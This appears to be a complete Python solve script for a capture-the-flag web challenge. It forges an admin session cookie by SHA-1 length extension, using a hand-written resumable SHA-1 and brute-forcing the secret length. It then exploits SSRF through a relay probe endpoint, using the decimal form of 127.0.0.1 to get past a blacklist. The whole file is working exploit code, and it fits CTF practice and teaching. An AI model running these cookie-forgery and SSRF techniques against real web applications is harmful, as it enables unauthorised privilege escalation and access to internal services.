#!/usr/bin/env python3
"""
Ash Relay Control: SHA-1 length-extension cookie forgery (operator->admin) + SSRF.

Cookie = hex("user=guest&role=operator") + "." + SHA1(secret || payload).
Append "&role=admin" via length extension (secret length brute-forced), which the
query parser resolves last-wins -> admin -> /relay unlocks. Then SSRF the internal
provisioning node via /relay/probe using the decimal encoding of 127.0.0.1.

Usage: python -I solve.py http://HOST:PORT
Pure stdlib (hand-rolled SHA-1 so the compression state can be resumed).
"""
import sys, struct, re, urllib.request, urllib.error, urllib.parse

# ---------- resumable SHA-1 ----------
def _rol(n, b): return ((n << b) | (n >> (32 - b))) & 0xffffffff
def sha1_compress(h, block):
    w = list(struct.unpack(">16I", block))
    for i in range(16, 80):
        w.append(_rol(w[i-3] ^ w[i-8] ^ w[i-14] ^ w[i-16], 1))
    a, b, c, d, e = h
    for i in range(80):
        if i < 20:   f, k = (b & c) | (~b & 0xffffffff & d), 0x5A827999
        elif i < 40: f, k = b ^ c ^ d, 0x6ED9EBA1
        elif i < 60: f, k = (b & c) | (b & d) | (c & d), 0x8F1BBCDC
        else:        f, k = b ^ c ^ d, 0xCA62C1D6
        a, b, c, d, e = (_rol(a,5)+f+e+k+w[i]) & 0xffffffff, a, _rol(b,30), c, d
    return [(h[0]+a)&0xffffffff,(h[1]+b)&0xffffffff,(h[2]+c)&0xffffffff,(h[3]+d)&0xffffffff,(h[4]+e)&0xffffffff]
def md_pad(msglen):
    return b"\x80" + b"\x00"*((56-(msglen+1)%64)%64) + struct.pack(">Q", msglen*8)
def sha1_extend(orig_hex, orig_total_len, append):
    h = list(struct.unpack(">5I", bytes.fromhex(orig_hex)))
    already = orig_total_len + len(md_pad(orig_total_len))
    msg = append + md_pad(already + len(append))
    for i in range(0, len(msg), 64):
        h = sha1_compress(h, msg[i:i+64])
    return "".join("%08x" % x for x in h)

def get(url, cookie=None):
    req = urllib.request.Request(url, headers={"Cookie": cookie} if cookie else {})
    try:
        r = urllib.request.urlopen(req, timeout=10)
        return r.status, r.read().decode(errors="replace"), r.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace"), e.headers

def main():
    base = sys.argv[1].rstrip("/")
    # 1. read the operator cookie
    _, _, hdrs = get(base + "/")
    sc = hdrs.get("Set-Cookie", "")
    m = re.search(r"session=([0-9a-f]+)\.([0-9a-f]{40})", sc)
    payload_hex, sig = m.group(1), m.group(2)
    original = bytes.fromhex(payload_hex)
    print("[*] payload:", original, "sig:", sig)

    # 2. length-extend &role=admin, brute secret length
    append = b"&role=admin"
    admin_cookie = None
    for klen in range(0, 65):
        forged = original + md_pad(klen + len(original)) + append
        new_sig = sha1_extend(sig, klen + len(original), append)
        cookie = "session=" + forged.hex() + "." + new_sig
        code, _, _ = get(base + "/relay", cookie)
        if code == 200:
            print(f"[+] secret length = {klen}; /relay unlocked (admin)")
            admin_cookie = cookie
            break
    if not admin_cookie:
        print("[-] no secret length in 0..64"); return

    # 3. SSRF the internal provisioning node (decimal 127.0.0.1 bypasses the blacklist)
    target = urllib.parse.quote("http://2130706433:9091/order", safe="")
    code, body, _ = get(f"{base}/relay/probe?target={target}", admin_cookie)
    flag = re.search(r"CSCTF\{[^}]*\}", body)
    print("[+] flag:", flag.group(0) if flag else "(not found)\n" + body[:500])

if __name__ == "__main__":
    main()
